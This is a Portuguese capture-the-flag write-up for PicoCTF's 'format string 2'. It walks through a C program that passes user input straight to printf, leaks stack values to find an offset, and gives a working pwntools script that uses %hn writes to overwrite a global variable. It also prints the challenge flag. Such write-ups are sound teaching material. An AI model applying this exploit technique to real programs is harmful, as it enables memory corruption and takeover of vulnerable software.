# WriteUp: format string 2

## Descrição do Desafio:
**Autor**: SkrubLawd \
**Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/448?category=6&page=1) \
**Categoria**: Binary Exploitation \
**Dificuldade**: Médio \
**Data**: 2024 \
**Descrição**:
> This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must *change* data on the stack!

## Passo a Passo da Solução

### 1. Análise do arquivo fornecido
Este desafio nos fornece tanto o executável como o arquivo fonte. Então, o primeiro passo é analisar o arquivo fonte e ver o que ele tem de interessante para nós.

{% code title="vuln.c" overflow="wrap" lineNumbers="true" %}

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

{% endcode %}

É um código simples, ele tem uma variável global inicializada com `0x21737573`, e imprimirá a **flag** caso o seu valor seja `0x67616c66`. Se repararmos, logo após inserirmos o *input*, o programa imprime ele, porém ele imprime passando o `buf` diretamente como parâmetro, sem informar as **strings de formato**, abrindo brecha para um possível ataque de *format string*.

### 2. Exploit
Para realizarmos um ataque de *format string*, nesse caso, nós precisamos saber o endereço da variável `sus` e o *offset* no qual o nosso *input* começa a aparecer na pilha.

{% hint style="info" %}

**Nota:** Como a variável `sus` é de escopo global, ela dificilmente estará armazenada na pilha.

{% endhint %}

Para sabermos o endereço da `sus`, precisamos saber inicialmente se o executável contém alguma proteção como o `PIE`.

```bash
└─$ checksec --file=vuln     
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   42 Symbols        No    0               2               vuln
```

E como podemos ver ele não contém, então para pegarmos o endereço da `sus` nós podemos usar a instrução `elf.sym['sus']` do **pwntools** (note que `elf` deve ser declarada anteriormente como `ELF('./vuln')`) ou simplesmente digitar `p &sus` no terminal do **pwndbg**. Com o endereço em mãos, vamos atrás do *offset*, cuja maneira mais fácil de se obter é executar o programa e digitar a sequência `%x-` no *input*, após isso ir contando quantos resultados apareceram antes dos *bytes* dos caracteres do input.

```bash
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x
Here's your input: 402075-0-77c5da00-0-95a2b0-77cafaf0-77c864e8-9-77c86de9-77a57098-77c734d0-0-757657c0-252d7825-2d78252d-78252d78-252d7825-2d78252d-78252d78-252d7825-2d78252d-78252d78-252d7825-2d78252d-77ca0078-77c758d8-77c821d4-0-0-0
sus = 0x21737573
You can do better!
```

No caso, eles começam a aparecer no 14º *offset*.

### 3. Solução
A solução é um tanto simples, devemos escrever `0x67616c66` caracteres e com o formato `%n` salvar no endereço obtido. Porém essa quantidade de caracteres tende a encerrar a execução do programa antes dele imprimir tudo, então dividiremos em duas partes: a parte superior (`6c66`) e a parte inferior (`6761`).

{% hint style="info" %}

**Nota:** A parte superior e inferior estão invertidas em relação ao valor `0x67616c66` por causa do formato `little-endian`.

{% endhint %}

Com essas duas partes, iniciamos o *payload* escrevendo o menor valor, e depois escrevemos o maior valor menos o que já foi imprimido. Após isso, completamos o *payload* com qualquer caractere para a pilha não ficar desalinhada (deve ser sempre múltiplo de 8 se for 64bits). Por fim inserimos os endereços, sendo o endereço original a parte superior e o endereço somado com mais 2 (deslocado 2 *bytes*) a parte inferior.

{% hint style="warning" %}

**Importante:** Os endereços devem estar no final do *payload* pois eles contém *bytes* nulos, que fazem o `printf()` parar de imprimir.

{% endhint %}

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
from pwn import *

elf = context.binary = ELF("./vuln")
p = remote("ip", porta)

sus = elf.sym['sus'] # Endereço da variável.

payload = b"%26465x%18$hn%1285x%19$hn|||||||" # Escrevendo o payload (no total ocupa 4 offsets).
payload += p64(sus + 2) # Escrevendo o endereço da parte inferior no offset 18
payload += p64(sus) # Escrevendo o endereço da parte superior no offset 19

p.sendlineafter(b"?\n", payload)
print(p.recvall().decode())
```

{% endcode %}

### Flag
`picoCTF{f0rm47_57r?_f0rm47_m3m_ccb55fce}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
